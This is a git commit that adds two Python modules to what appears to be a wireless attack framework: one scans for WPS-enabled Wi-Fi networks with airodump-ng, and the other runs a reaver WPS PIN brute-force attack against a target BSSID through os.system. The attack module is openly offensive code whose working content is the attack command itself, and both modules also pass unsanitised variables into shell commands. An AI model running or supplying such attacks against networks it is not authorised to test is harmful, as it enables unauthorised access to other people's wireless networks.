43dee8b434a872e0fe2ca60e672ad2bf402cee59
Amer Araibia <46226856+ameraraibia168@users.noreply.github.com>
2024-07-13 14:01:27 +0100

    Add files via upload

---
+++ waf/modules/wireless/wifi/wps/network_attack_reaver.py
@@ -0,0 +1,33 @@
+import time,os
+from waf.libs.color  import *
+from waf.libs import variable as var
+
+info = {
+        "name"        : "network_attack_reaver",
+        "title"       : "WPS networks attacks [reaver]",
+        "module"      : "wireless/wifi/wps attack  reaver network ",
+        "description" : "attack wps in network with reaver"
+}
+
+options ={
+  "INTERFACE" : [str(var.all_var['interface']),'enter the interface [wlan0/wlan0mon]'],
+  "BSSID"     : [str(var.all_var['bssid']),'enter the bssid of the target']
+
+}
+
+def running():
+        try:
+                print ("")
+                print (blue+"[*]"+default+ "Starting a attack network")
+                time.sleep(2)
+                print ("")
+                time.sleep(2)
+                print ("") 
+                order =  ("reaver -i {} -b {} -vv").format(var.all_var['interface'],var.all_var['bssid'])
+                geny = os.system(order)
+                print("\n")
+                print (green_underline+"[*] Done"+default)
+                time.sleep(2)
+                print ("")
+        except Exception as e:
+                print(red+"\n[-]"+default+"Error : "+str(e))
---
+++ waf/modules/wireless/wifi/wps/scan_network.py
@@ -0,0 +1,32 @@
+import time,os
+from waf.libs.color  import *
+from waf.libs import variable as var
+
+info = {
+        "name"        : "scan_network",
+        "title"       : "Scan for WPS networks",
+        "module"      : "wireless/wifi/wps scan  network  network_manager",
+        "description" : "Scan for WPS Networks"
+}
+
+options ={
+  "INTERFACE" : [str(var.all_var['interface']),'enter the interface [wlan0/wlan0mon]']
+}
+
+def running():
+        try:
+                print ("")
+                print (blue+"[*]"+default+ "Starting a scan for WPS networks")
+                time.sleep(2)
+                print ("")
+                time.sleep(2)
+                print ("") 
+                order = "airodump-ng -M --wps {}".format(var.all_var['interface'])
+                geny = os.system(order)
+                cmd = os.system("sleep 5 ")
+                print("\n")
+                print (green_underline+"[*] Done"+default)
+                time.sleep(2)
+                print ("")
+        except Exception as e:
+                print(red+"\n[-]"+default+"Error : "+str(e))
